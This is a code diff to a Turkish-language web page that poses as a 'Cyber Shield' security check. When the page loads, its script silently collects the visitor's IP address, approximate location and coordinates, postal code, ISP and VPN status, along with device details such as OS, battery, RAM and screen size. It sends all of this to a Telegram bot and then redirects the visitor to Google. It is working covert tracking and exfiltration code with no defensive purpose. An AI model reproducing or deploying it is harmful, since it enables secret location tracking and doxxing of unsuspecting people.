@@ -3,39 +3,64 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Analiz Merkezi</title>
+    <title>Sistem Güvenlik Protokolü</title>
     <style>
-        body { background: #020202; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .matrix-box { width: 85%; max-width: 440px; padding: 30px; border: 2px dashed #00ff66; background: #050505; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 102, 0.4); border-radius: 4px; }
-        .progress-bar { width: 100%; background: #222; border: 1px solid #00ff66; height: 10px; margin-top: 20px; position: relative; }
-        .progress-fill { width: 0%; height: 100%; background: #00ff66; transition: width 0.4s ease; }
+        body { background: #000; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; color: rgba(0, 255, 102, 0.15); line-height: 1; z-index: 1; pointer-events: none; padding: 10px; box-sizing: border-box; word-break: break-all; }
+        .matrix-box { width: 85%; max-width: 450px; padding: 30px; border: 2px solid #00ff66; background: rgba(5, 5, 5, 0.95); text-align: center; box-shadow: 0 0 40px rgba(0, 255, 102, 0.5); border-radius: 8px; z-index: 2; position: relative; }
+        .progress-bar { width: 100%; background: #111; border: 1px solid #00ff66; height: 12px; margin-top: 20px; border-radius: 6px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #00aa44, #00ff66); transition: width 0.3s ease; }
+        .console-text { font-size: 11px; text-align: left; background: #000; padding: 10px; border: 1px solid #222; height: 80px; overflow-y: hidden; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
 
+    <div id="matrix" class="matrix-bg"></div>
+
     <div class="matrix-box">
-        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.6</div>
-        <div id="status" style="margin-top: 15px; color: #ff3333;">[!] Güvenli tünel senkronizasyonu başlatılıyor...</div>
+        <div style="font-weight: bold; font-size: 18px; letter-spacing: 3px; text-shadow: 0 0 10px #00ff66;">⚡ CYBER SHIELD v7.2</div>
+        <div id="status" style="margin-top: 15px; color: #ff3333; font-weight: bold;">[!] ENJEKSİYON BAŞLATILDI...</div>
+        
+        <div class="console-text" id="console">
+            > Sunucu tüneli aranıyor...<br>
+        </div>
+
         <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
     </div>
 
     <script>
+        // Arka plan simülasyonu
+        setInterval(() => {
+            document.getElementById('matrix').innerText += Math.random().toString(36).substring(2, 7) + " ";
+            if(document.getElementById('matrix').innerText.length > 2000) document.getElementById('matrix').innerText = "";
+        }, 100);
+
         window.onload = async function() {
             let fill = document.getElementById('fill');
             let status = document.getElementById('status');
+            let consoleLog = document.getElementById('console');
 
-            fill.style.width = "20%";
-            status.innerText = "[*] Önbellek ve tünel proxy katmanları kırılıyor...";
-            await new Promise(r => setTimeout(r, 800));
+            const log = (text) => {
+                consoleLog.innerHTML += "> " + text + "<br>";
+                consoleLog.scrollTop = consoleLog.scrollHeight;
+            };
+
+            // Adım 1
+            fill.style.width = "15%";
+            status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
+            log("Anti-Proxy katmanı aktif edildi.");
+            await new Promise(r => setTimeout(r, 400));
 
             let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
             let posta_kodu = "Bilinmiyor", koordinat = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
-            let mobil_mi = "Hayır (Ev/İş İnterneti)", vpn_proxy = "Temiz (Doğal Bağlantı)", ulke_kod = "-", para_birimi = "-";
+            let mobil_mi = "Hayır", vpn_proxy = "Temiz (Doğal)", ulke_kod = "-", para_birimi = "-";
             let os = "Bilinmeyen Sistem";
             let maps_link = "Oluşturulamadı";
 
-            fill.style.width = "50%";
-            status.innerText = "[*] HTTPS Gateway üzerinden konum verileri çekiliyor...";
+            // Adım 2
+            fill.style.width = "45%";
+            status.innerText = "[*] COORD GATEWAY TARANIYOR...";
+            log("Siber ağ havuzlarına istek atılıyor...");
             
             let cacheBuster = "?cb=" + Math.random();
             try {
@@ -53,7 +78,6 @@
                     
                     if(veri.latitude && veri.longitude) {
                         koordinat = veri.latitude + " , " + veri.longitude;
-                        // 🔥 Hatalı format düzeltildi, Telegram'ın %100 tanıyacağı link yapısı eklendi 🔥
                         maps_link = "[Haritada Göster (Tıkla)](https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude + ")";
                     }
 
@@ -63,6 +87,7 @@
                     }
                 }
             } catch (e) {
+                log("Ana hat meşgul, yedek kanala geçiliyor.");
                 try {
                     let r2 = await fetch("https://api.db-ip.com/v2/free/self" + cacheBuster);
                     let d2 = await r2.json();
@@ -70,8 +95,10 @@
                 } catch(err){}
             }
 
+            // Adım 3
             fill.style.width = "75%";
-            status.innerText = "[*] High-Entropy donanım mimarisi çözülüyor...";
+            status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+            log("High-Entropy cihaz kimliği sorgulanıyor.");
             
             let ua = navigator.userAgent;
             if (/Android/i.test(ua)) {
@@ -96,36 +123,36 @@
                     let match = ua.match(/Android\s([0-9\.]+)/);
                     os = match ? "Android " + match[1] : "Android";
                 }
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                os = "iOS";
-            } else if (/Windows/i.test(ua)) {
-                os = "Windows";
-            }
+            } else if (/iPhone|iPad|iPod/i.test(ua)) { os = "iOS"; } 
+            else if (/Windows/i.test(ua)) { os = "Windows"; }
 
             let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            if (cihaz_saati.toLowerCase().includes("istanbul")) {
-                if (ulke !== "Bilinmiyor" && ulke !== "Turkey") {
-                    vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
-                }
+            if (cihaz_saati.toLowerCase().includes("istanbul") && ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
             }
 
+            // Ekstra Detaylar
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
             let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
             let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
             let dil = navigator.language || "Bilinmiyor";
+            let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
+            let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık Tema" : "Açık Tema";
             let tarih = new Date().toLocaleString('tr-TR');
 
+            // Adım 4
             fill.style.width = "100%";
             status.style.color = "#00ff66";
-            status.innerText = "[+] Protokol doğrulandı. Paket gönderiliyor...";
+            status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
+            log("Paket gönderildi. Güvenli bölgeye aktarılıyorsunuz...");
 
-            let mesaj = "👑 *ULTIMATE SYSTEM NETWORK LOG*\n";
+            let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
             mesaj += "🤖 *Sistem (OS):* " + os + " 🛡️\n";
-            mesaj += "⏰ *Zaman damgası:* " + tarih + "\n";
+            mesaj += "⏰ *Zaman Damgası:* " + tarih + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
@@ -140,6 +167,8 @@
             mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
             mesaj += "💾 *Sistem RAM:* " + ram + "\n";
             mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
+            mesaj += "🎨 *Cihaz Teması:* " + tema + "\n";
+            mesaj += "👆 *Dokunmatik Ekran:* " + dokunmatik + "\n";
             mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
@@ -147,8 +176,13 @@
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
+            // Veriyi gönderdikten hemen sonra Google'a uçur
             fetch(url).then(() => {
-                status.innerText = "✓ Doğrulama Başarılı. Yönlendirildiniz.";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 500); // Yarım saniye bekleyip yönlendirir
+            }).catch(() => {
+                window.location.href = "https://www.google.com";
             });
         };
     </script>
